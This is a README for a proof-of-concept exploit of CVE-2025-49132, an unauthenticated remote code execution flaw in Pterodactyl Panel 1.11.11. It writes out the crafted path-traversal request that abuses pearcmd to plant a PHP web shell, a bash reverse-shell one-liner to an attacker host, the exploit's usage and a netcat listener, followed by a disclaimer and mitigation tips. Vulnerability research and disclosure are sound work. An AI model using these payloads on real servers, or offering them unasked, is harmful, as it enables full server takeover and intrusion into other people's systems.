# Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)

## 📌 Description

This repository contains a **Proof of Concept (PoC)** exploit for:

* **Application:** Pterodactyl Panel
* **Version:** 1.11.11
* **Vulnerability:** Remote Code Execution (RCE)
* **CVE:** CVE-2025-49132
* **EDB-ID:** 52341
* **Platform:** Multiple
* **Type:** Web Application
* **Author (Exploit DB):** Zen-kun04
* **Disclosure Date:** 2025-06-26

---

## 🧠 Vulnerability Overview

The vulnerability in **Pterodactyl Panel 1.11.11** allows an unauthenticated attacker to achieve **Remote Code Execution (RCE)** via path traversal and abuse of the PEAR `pearcmd` functionality.

The exploit works by:

1. Leveraging directory traversal in the `locale` parameter
2. Abusing `pearcmd` to create a malicious PHP file (`/tmp/cmd.php`)
3. Triggering the web shell to execute arbitrary system commands
4. Executing a reverse shell to attacker-controlled host

---

## ⚙️ Requirements

* Python 3
* `pwntools`
* `requests`

Install dependencies:

```bash
pip install pwntools requests
```

---

## 🚀 Usage

```bash
python3 exploit.py -url <TARGET> -lhost <YOUR_IP> -lport <YOUR_PORT>
```

### Example:

```bash
python3 exploit.py -url 192.168.1.10 -lhost 192.168.1.5 -lport 4444
```

Start a listener before running the exploit:

```bash
nc -lvnp 4444
```

---

## 🔥 How It Works

### Step 1 – Upload Web Shell

The exploit sends a crafted GET request:

```
/locales/locale.json?locale=../../../../../../usr/share/php/PEAR
&namespace=pearcmd
&+config-create+/<?=system($_GET[0])?>+/tmp/cmd.php
```

This creates a malicious PHP file:

```
/tmp/cmd.php
```

---

### Step 2 – Trigger Reverse Shell

The script then executes:

```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

Which results in a reverse shell connection back to the attacker.

---

## 🛡️ Impact

An attacker can:

* Execute arbitrary system commands
* Gain remote shell access
* Fully compromise the server
* Access sensitive configuration files
* Pivot inside internal networks


---

## ⚠️ Disclaimer

This Proof of Concept is provided for:

* Educational purposes
* Security research
* Authorized penetration testing

Do **NOT** use this against systems you do not own or have explicit permission to test.

The author is not responsible for any misuse or damage caused.

---

## 🛠️ Mitigation

* Upgrade Pterodactyl Panel to a patched version (when available)
* Restrict access to `/locales/` endpoint
* Disable unused PEAR components
* Apply strict input validation and sanitization
* Use a Web Application Firewall (WAF)

